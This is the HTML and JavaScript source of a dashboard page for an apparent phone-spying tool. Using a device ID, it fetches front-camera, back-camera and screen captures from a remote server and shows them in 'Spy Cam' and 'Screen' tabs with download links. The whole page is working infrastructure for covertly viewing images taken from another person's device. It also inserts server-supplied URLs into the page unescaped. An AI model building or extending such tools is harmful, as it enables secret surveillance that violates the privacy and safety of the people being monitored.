<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Spy & Screen Records</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- DARK THEME --- */
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text-main: #ffffff;
            --accent-cam: #ff4444; /* Red for Spy */
            --accent-screen: #00f3ff; /* Cyan for Screen */
        }
        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            min-height: 100vh;
        }

        /* --- HEADER --- */
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
        .back-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            color: #fff; padding: 10px 15px; border-radius: 12px;
            cursor: pointer; text-decoration: none; font-size: 1rem;
        }
        .page-title { font-size: 1.1rem; font-weight: bold; color: #fff; text-transform: uppercase; letter-spacing: 1px; }

        /* --- 2 TABS ONLY --- */
        .tabs-container {
            display: flex; gap: 15px; margin-bottom: 25px;
            background: rgba(255,255,255,0.03); padding: 8px; border-radius: 15px;
        }
        .tab-btn {
            flex: 1; padding: 12px; border: none; outline: none;
            background: transparent; color: #666;
            font-size: 0.95rem; font-weight: 600;
            border-bottom: 2px solid transparent;
            cursor: pointer; transition: 0.3s;
            display: flex; align-items: center; justify-content: center; gap: 8px;
        }
        .tab-btn.active { color: #fff; background: rgba(255,255,255,0.05); border-radius: 10px; }
        
        /* Specific Tab Colors */
        .tab-btn[data-target="camera"].active { border-bottom-color: var(--accent-cam); color: var(--accent-cam); }
        .tab-btn[data-target="screen"].active { border-bottom-color: var(--accent-screen); color: var(--accent-screen); }

        /* --- GRID --- */
        .gallery-container {
            display: grid;
            grid-template-columns: repeat(3, 1fr); /* 3 photos per row */
            gap: 10px;
            padding-bottom: 50px;
        }

        .img-card {
            aspect-ratio: 1 / 1;
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            border: 1px solid var(--glass-border);
            cursor: pointer;
        }
        .img-card img {
            width: 100%; height: 100%; object-fit: cover;
            transition: transform 0.3s;
        }
        .img-card:hover img { transform: scale(1.1); }

        /* Badge (Front/Back/Screen) */
        .source-badge {
            position: absolute; bottom: 0; left: 0; right: 0;
            background: rgba(0,0,0,0.7); color: #fff;
            font-size: 0.6rem; padding: 4px; text-align: center;
            text-transform: uppercase; letter-spacing: 0.5px;
        }

        /* --- STATUS --- */
        .status-msg { text-align: center; margin-top: 60px; color: #777; font-size: 0.9rem; display: none; }
        .loader {
            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--accent-screen);
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; margin: 0 auto 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* --- MODAL --- */
        .modal {
            display: none; position: fixed; z-index: 1000;
            left: 0; top: 0; width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.95);
            align-items: center; justify-content: center; flex-direction: column;
        }
        .modal img { max-width: 95%; max-height: 80vh; border-radius: 5px; box-shadow: 0 0 20px #000; }
        .modal-close { position: absolute; top: 20px; right: 20px; color: #fff; font-size: 2rem; cursor: pointer; }
        
        .modal-actions { margin-top: 20px; display: flex; gap: 20px; }
        .action-btn {
            background: #333; color: #fff; padding: 10px 25px;
            border-radius: 30px; text-decoration: none; font-size: 0.9rem;
            display: flex; align-items: center; gap: 8px; border: 1px solid #555;
        }
        .btn-download { background: var(--accent-screen); color: #000; border: none; font-weight: bold; }

    </style>
</head>
<body>

    <div class="header">
        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <div class="page-title">Captured Data</div>
        <div style="width: 40px;"></div> 
    </div>

    <div class="tabs-container">
        <button class="tab-btn active" data-target="camera" onclick="filterFiles('camera')">
            <i class="fa-solid fa-eye"></i> Spy Cam
        </button>
        <button class="tab-btn" data-target="screen" onclick="filterFiles('screen')">
            <i class="fa-solid fa-mobile-screen"></i> Screen
        </button>
    </div>

    <div id="loading" class="status-msg" style="display: block;">
        <div class="loader"></div> Loading...
    </div>
    
    <div id="emptyState" class="status-msg">
        <i class="fa-regular fa-folder-open" style="font-size: 2rem; margin-bottom: 10px;"></i><br>
        No captures found here.
    </div>

    <div class="gallery-container" id="galleryGrid"></div>

    <div id="imageModal" class="modal">
        <span class="modal-close" onclick="closeModal()">&times;</span>
        <img id="fullImage" src="">
        <div class="modal-actions">
            <a id="downloadLink" href="#" download class="action-btn btn-download">
                <i class="fa-solid fa-download"></i> Save
            </a>
            <button onclick="closeModal()" class="action-btn">Close</button>
        </div>
    </div>

    <script>
        // ðŸ”¥ SERVER URL
        const API_BASE = 'https://child-v9no.onrender.com'; 
        
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');

        let allFilesData = []; 
        let currentFilter = 'camera'; 

        const galleryGrid = document.getElementById('galleryGrid');
        const loading = document.getElementById('loading');
        const emptyState = document.getElementById('emptyState');
        const modal = document.getElementById('imageModal');
        const fullImage = document.getElementById('fullImage');
        const downloadLink = document.getElementById('downloadLink');
        const tabs = document.querySelectorAll('.tab-btn');

        window.onload = function() {
            if(!DEVICE_ID) {
                alert("Device ID not found!");
                return;
            }
            fetchSavedFiles();
        };

        function fetchSavedFiles() {
            fetch(`${API_BASE}/api/gallery-list/${DEVICE_ID}`)
                .then(response => response.json())
                .then(data => {
                    loading.style.display = 'none';
                    
                    let files = [];
                    if (data.photos) { files = data.photos; } 
                    else if (Array.isArray(data)) { files = data; }

                    if (files.length > 0) {
                        allFilesData = files;
                        filterFiles('camera'); // By default Camera tab khulega
                    } else {
                        emptyState.style.display = 'block';
                        emptyState.innerText = "No data uploaded yet.";
                    }
                })
                .catch(error => {
                    loading.innerHTML = "<span style='color:red'>Failed to connect.</span>";
                });
        }

        // ðŸ”¥ STRICT FILTER LOGIC (Sirf Spy or Screen dikhega)
        function filterFiles(category) {
            currentFilter = category;

            // UI Update
            tabs.forEach(btn => {
                btn.classList.remove('active');
                if(btn.dataset.target === category) btn.classList.add('active');
            });

            galleryGrid.innerHTML = '';
            emptyState.style.display = 'none';

            // Filter
            const filtered = allFilesData.filter(url => {
                const lowerUrl = url.toLowerCase();
                
                // TAB 1: SPY CAMERA
                if (category === 'camera') {
                    // Sirf tabhi dikhao agar 'front_camera' ya 'back_camera' likha ho
                    return lowerUrl.includes('front_camera') || lowerUrl.includes('back_camera');
                } 
                // TAB 2: SCREENSHOT
                else if (category === 'screen') {
                    // Sirf tabhi dikhao agar 'screen_capture' likha ho
                    return lowerUrl.includes('screen_capture');
                }
                
                return false; // Jo normal gallery hai wo yahan nahi dikhegi
            });

            if (filtered.length === 0) {
                emptyState.style.display = 'block';
                return;
            }

            // Render
            filtered.forEach(url => {
                const div = document.createElement('div');
                div.className = 'img-card';
                div.onclick = () => openModal(url);

                let badgeText = "";
                if(url.includes('front_camera')) badgeText = "Front Cam";
                if(url.includes('back_camera')) badgeText = "Back Cam";
                if(url.includes('screen_capture')) badgeText = "Screen";

                div.innerHTML = `
                    <img src="${url}" loading="lazy" onerror="this.style.display='none'">
                    <div class="source-badge">${badgeText}</div>
                `;
                galleryGrid.appendChild(div);
            });
        }

        // Modal
        function openModal(url) {
            fullImage.src = url;
            downloadLink.href = url;
            modal.style.display = 'flex';
        }

        function closeModal() {
            modal.style.display = 'none';
            fullImage.src = '';
        }

        modal.addEventListener('click', function(e) {
            if (e.target === modal) closeModal();
        });

    </script>
</body>
</html>
